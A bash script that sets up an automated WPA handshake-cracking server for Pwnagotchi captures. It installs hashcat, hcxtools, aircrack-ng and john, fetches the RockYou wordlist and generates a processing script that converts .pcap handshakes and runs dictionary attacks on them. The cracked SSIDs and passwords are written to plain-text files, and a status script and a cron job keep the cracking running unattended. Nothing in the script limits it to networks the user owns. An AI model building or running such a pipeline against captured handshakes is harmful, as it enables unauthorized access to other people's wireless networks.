#!/bin/bash
# Pwnagotchi Cracking Server Setup for Ubuntu 24.04
# Run this after fixing NVIDIA drivers

set -e

echo "=========================================="
echo "Pwnagotchi Cracking Server Setup"
echo "For Ubuntu 24.04 with GTX 960"
echo "=========================================="
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run with sudo"
    exit 1
fi

echo "[1/8] Updating system packages..."
apt-get update

echo "[2/8] Installing hashcat and dependencies..."
apt-get install -y \
    hashcat \
    hcxtools \
    hcxdumptool \
    aircrack-ng \
    john \
    crunch \
    rsync \
    wget \
    curl \
    git \
    build-essential

echo "[3/8] Checking NVIDIA drivers..."
if ! command -v nvidia-smi &> /dev/null; then
    echo "WARNING: NVIDIA drivers not detected!"
    echo "Install with: sudo ubuntu-drivers install"
    echo "Then reboot and re-run this script"
else
    echo "NVIDIA driver detected:"
    nvidia-smi --query-gpu=name,driver_version --format=csv
fi

echo "[4/8] Creating directory structure..."
CRACK_DIR="/home/$SUDO_USER/pwnagotchi-cracking"
mkdir -p "$CRACK_DIR"/{incoming,processing,cracked,failed,wordlists,hashes,logs}
chown -R $SUDO_USER:$SUDO_USER "$CRACK_DIR"

echo "[5/8] Downloading wordlists..."
cd "$CRACK_DIR/wordlists"

# RockYou (most popular)
if [ ! -f "rockyou.txt" ]; then
    echo "Downloading RockYou wordlist..."
    wget -q --show-progress https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
fi

# Create WiFi-specific wordlist
if [ ! -f "wifi-common.txt" ]; then
    echo "Creating WiFi common passwords list..."
    cat > wifi-common.txt << 'EOF'
password
password123
password1
12345678
123456789
1234567890
qwerty123
admin123
welcome123
changeme
letmein
trustno1
monkey123
dragon123
baseball
iloveyou
sunshine
princess
football
abc123456
EOF
fi

echo "[6/8] Creating processing script..."
cat > "$CRACK_DIR/process-handshakes.sh" << 'SCRIPT_EOF'
#!/bin/bash
# Automated handshake processing and cracking

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INCOMING="$SCRIPT_DIR/incoming"
PROCESSING="$SCRIPT_DIR/processing"
CRACKED="$SCRIPT_DIR/cracked"
FAILED="$SCRIPT_DIR/failed"
HASHES="$SCRIPT_DIR/hashes"
WORDLISTS="$SCRIPT_DIR/wordlists"
LOG_DIR="$SCRIPT_DIR/logs"
LOG_FILE="$LOG_DIR/cracking-$(date +%Y%m%d).log"

# Wordlist priority (fastest to slowest)
WORDLISTS_PRIORITY=(
    "$WORDLISTS/wifi-common.txt"
    "$WORDLISTS/rockyou.txt"
)

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Check for NVIDIA GPU
if ! command -v nvidia-smi &> /dev/null; then
    log "WARNING: nvidia-smi not found, using CPU only (slow)"
    HASHCAT_DEVICE=""
else
    # Force GPU usage
    HASHCAT_DEVICE="-d 1"
    log "Using GPU: $(nvidia-smi --query-gpu=name --format=csv,noheader)"
fi

# Process each PCAP file
for pcap in "$INCOMING"/*.pcap; do
    [ -e "$pcap" ] || continue

    filename=$(basename "$pcap")
    base="${filename%.pcap}"
    hashfile="$HASHES/${base}.22000"

    log "=========================================="
    log "Processing: $filename"

    # Move to processing
    mv "$pcap" "$PROCESSING/"

    # Convert to hashcat format
    log "Converting to hashcat format..."
    hcxpcapngtool -o "$hashfile" "$PROCESSING/$filename" 2>&1 | tee -a "$LOG_FILE"

    if [ ! -s "$hashfile" ]; then
        log "ERROR: No valid handshakes in $filename"
        mv "$PROCESSING/$filename" "$FAILED/"
        continue
    fi

    # Count handshakes
    handshake_count=$(grep -c "^WPA" "$hashfile" || echo "0")
    log "Found $handshake_count handshake(s)"

    # Try each wordlist
    cracked=false
    for wordlist in "${WORDLISTS_PRIORITY[@]}"; do
        if [ ! -f "$wordlist" ]; then
            log "Wordlist not found: $wordlist"
            continue
        fi

        wordlist_name=$(basename "$wordlist")
        wordlist_size=$(wc -l < "$wordlist")
        log "Attempting crack with $wordlist_name ($wordlist_size passwords)..."

        # Estimate time
        if [ -n "$HASHCAT_DEVICE" ]; then
            speed="150000"  # GTX 960 approximate
            est_time=$((wordlist_size / speed))
            log "Estimated time: ~${est_time}s with GPU"
        fi

        # Run hashcat
        hashcat -m 22000 \
            $HASHCAT_DEVICE \
            "$hashfile" \
            "$wordlist" \
            --quiet \
            --force \
            --hwmon-disable \
            -o "$CRACKED/${base}.txt" \
            --outfile-format=2 \
            2>&1 | tee -a "$LOG_FILE"

        # Check if cracked
        cracked_output=$(hashcat -m 22000 "$hashfile" --show 2>/dev/null || echo "")

        if [ -n "$cracked_output" ]; then
            log "SUCCESS: Cracked with $wordlist_name!"
            echo "$cracked_output" | tee -a "$CRACKED/${base}.txt"

            # Extract password for notification
            password=$(echo "$cracked_output" | cut -d':' -f4)
            ssid=$(echo "$cracked_output" | cut -d':' -f3)
            log "SSID: $ssid"
            log "Password: $password"

            # Save detailed info
            {
                echo "Capture File: $filename"
                echo "Cracked: $(date)"
                echo "Wordlist: $wordlist_name"
                echo "SSID: $ssid"
                echo "Password: $password"
                echo ""
                echo "Full hash:"
                echo "$cracked_output"
            } > "$CRACKED/${base}.info"

            mv "$PROCESSING/$filename" "$CRACKED/"
            cracked=true
            break
        else
            log "No match in $wordlist_name"
        fi
    done

    # If not cracked, move to failed
    if [ "$cracked" = false ]; then
        log "FAILED: Could not crack $filename with available wordlists"
        mv "$PROCESSING/$filename" "$FAILED/"
    fi

    log "=========================================="
done

log "Batch processing complete"

# Cleanup old logs (keep 30 days)
find "$LOG_DIR" -name "cracking-*.log" -mtime +30 -delete

SCRIPT_EOF

chmod +x "$CRACK_DIR/process-handshakes.sh"
chown $SUDO_USER:$SUDO_USER "$CRACK_DIR/process-handshakes.sh"

echo "[7/8] Creating status monitor..."
cat > "$CRACK_DIR/status.sh" << 'STATUS_EOF'
#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "=========================================="
echo "PWNAGOTCHI CRACKING STATUS"
echo "=========================================="
echo ""

echo "Directory Status:"
echo "  Incoming:       $(ls -1 $SCRIPT_DIR/incoming/*.pcap 2>/dev/null | wc -l) handshakes"
echo "  Processing:     $(ls -1 $SCRIPT_DIR/processing/*.pcap 2>/dev/null | wc -l) in queue"
echo "  Cracked:        $(ls -1 $SCRIPT_DIR/cracked/*.txt 2>/dev/null | wc -l) successful"
echo "  Failed:         $(ls -1 $SCRIPT_DIR/failed/*.pcap 2>/dev/null | wc -l) failed"
echo ""

echo "Recent Cracks (last 7 days):"
if [ -d "$SCRIPT_DIR/cracked" ]; then
    find "$SCRIPT_DIR/cracked" -name "*.info" -mtime -7 | while read info; do
        echo "---"
        cat "$info" | grep -E "SSID|Password|Cracked"
    done
fi
echo ""

echo "Hardware Status:"
if command -v nvidia-smi &> /dev/null; then
    nvidia-smi --query-gpu=name,temperature.gpu,utilization.gpu,memory.used --format=csv
else
    echo "  GPU: Not available (CPU only)"
fi
echo ""

echo "Disk Usage:"
df -h "$SCRIPT_DIR" | grep -v Filesystem
echo ""

echo "Last 10 log entries:"
if [ -f "$SCRIPT_DIR/logs/cracking-$(date +%Y%m%d).log" ]; then
    tail -10 "$SCRIPT_DIR/logs/cracking-$(date +%Y%m%d).log"
fi
echo ""

echo "=========================================="
STATUS_EOF

chmod +x "$CRACK_DIR/status.sh"
chown $SUDO_USER:$SUDO_USER "$CRACK_DIR/status.sh"

echo "[8/8] Setting up cron job..."
# Add cron job to run processing every 15 minutes
CRON_CMD="*/15 * * * * $CRACK_DIR/process-handshakes.sh"
(crontab -u $SUDO_USER -l 2>/dev/null | grep -v "process-handshakes.sh"; echo "$CRON_CMD") | crontab -u $SUDO_USER -

echo ""
echo "=========================================="
echo "Setup Complete!"
echo "=========================================="
echo ""
echo "Next Steps:"
echo ""
echo "1. Test hashcat with your GPU:"
echo "   hashcat -b -m 22000"
echo ""
echo "2. Check status anytime:"
echo "   $CRACK_DIR/status.sh"
echo ""
echo "3. Manually process handshakes:"
echo "   $CRACK_DIR/process-handshakes.sh"
echo ""
echo "4. Set up Pwnagotchi to sync here:"
echo "   Edit /etc/pwnagotchi/config.toml on Pwnagotchi"
echo "   Add sync script from SETUP_GUIDE.md"
echo ""
echo "Directory structure:"
echo "  $CRACK_DIR/incoming/    - Place .pcap files here"
echo "  $CRACK_DIR/cracked/     - Successful cracks saved here"
echo "  $CRACK_DIR/failed/      - Uncrackable handshakes"
echo "  $CRACK_DIR/wordlists/   - Add more wordlists here"
echo "  $CRACK_DIR/logs/        - Processing logs"
echo ""
echo "Cron job installed: Runs every 15 minutes"
echo ""
